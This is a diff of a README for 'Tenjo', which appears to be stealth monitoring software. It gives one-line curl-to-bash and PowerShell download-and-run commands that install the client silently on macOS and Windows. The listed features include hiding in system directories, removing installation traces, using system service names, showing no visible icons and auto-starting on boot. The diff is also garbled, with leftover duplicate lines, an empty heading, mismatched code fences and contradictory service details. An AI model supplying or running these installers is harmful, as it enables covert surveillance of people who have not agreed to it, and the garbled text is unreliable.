@@ -1,53 +1,32 @@
-# Tenjo Stealth Installation Commands
+# Tenjo Remote Installation Commands
 
 ## One-Line Remote Installation (Stealth Mode)
 
 ### macOS - Silent Installation
 ```bash
-curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_macos.sh | bash -s true
+curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_macos.sh | bash
 ```
 
 ### Windows - Silent Installation
 ```cmd
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_windows.bat' -OutFile '%TEMP%\quick_install.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_install.bat' true; del '%TEMP%\quick_install.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_windows.bat' -OutFile '%TEMP%\install.bat' -UseBasicParsing; cmd /c '%TEMP%\install.bat'; del '%TEMP%\install.bat'"
 ```
-
-## Manual Installation (if needed)
-
-### macOS
-1. Download repository
-2. Navigate to client directory
-3. Run: `bash quick_install_stealth_macos.sh true`
-
-### Windows
-1. Download repository
-2. Navigate to client directory
-3. Run: `quick_install_stealth_windows.bat true`
 
 ## Uninstallation Commands
 
 ### macOS - One-Line Remote Uninstall
 ```bash
-curl -s https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_macos.sh | bash
+curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_macos.sh | bash
 ```
 
 ### Windows - One-Line Remote Uninstall
 ```cmd
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_windows.bat' -OutFile '%TEMP%\quick_uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_uninstall.bat'; del '%TEMP%\quick_uninstall.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%TEMP%\uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\uninstall.bat'; del '%TEMP%\uninstall.bat'"
+```
+curl -s https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_macos.sh | bash
 ```
 
-### Manual Uninstall (if needed)
-
-#### macOS
-```bash
-bash quick_uninstall_stealth_macos.sh
-```
-
-#### Windows
-```cmd
-quick_uninstall_stealth_windows.bat
-```
-
+### Windows - One-Line Remote Uninstall
 ## Features
 
 ### ✅ Completely Silent Operation
@@ -56,13 +35,35 @@ quick_uninstall_stealth_windows.bat
 - Auto-starts on boot/login
 - No taskbar or system tray icons
 
-### ✅ Stealth Installation
-- Downloads and installs automatically
-- Hides in system directories
-- Removes installation traces
-- Uses system service names
+### ✅ Remote Installation
+- Downloads all files from GitHub automatically
+- No need to pre-download or copy files
+- One-line command installation
+- Self-contained with all dependencies
 
 ### ✅ Auto-Start Configuration
+- **macOS**: Uses LaunchAgent service
+- **Windows**: Uses Windows Service
+- Automatically starts on system boot
+- Resilient restart on failure
+
+### ✅ Stealth Operation
+- Hidden installation directory
+- Background monitoring
+- Minimal system footprint
+- No visible UI components
+
+## Installation Locations
+
+### macOS
+- Installation directory: `~/.tenjo/`
+- Service file: `~/Library/LaunchAgents/com.tenjo.monitor.plist`
+- Logs: `~/.tenjo/logs/`
+
+### Windows  
+- Installation directory: `%USERPROFILE%\.tenjo\`
+- Service name: `TenjoMonitor`
+- Logs: `%USERPROFILE%\.tenjo\logs\`
 - **macOS**: LaunchAgent/LaunchDaemon
 - **Windows**: Task Scheduler
 - Starts automatically when computer boots
